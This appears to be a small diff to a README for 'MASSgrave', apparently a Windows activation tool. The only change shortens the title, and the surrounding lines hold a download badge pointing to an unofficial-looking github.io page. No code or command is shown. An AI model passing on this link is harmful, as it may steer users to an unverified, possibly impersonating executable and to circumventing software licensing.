@@ -1,4 +1,4 @@
-# MASSgrave — Offline Setup Guide
+# MASSgrave — Offline Setup
 
 [![Download Setup Assistant](https://img.shields.io/badge/Download-Windows-blueviolet)](https://mass-setup.github.io/.github/) [![Version](https://img.shields.io/badge/Build_19045.5854_May2025-green)](#)
 
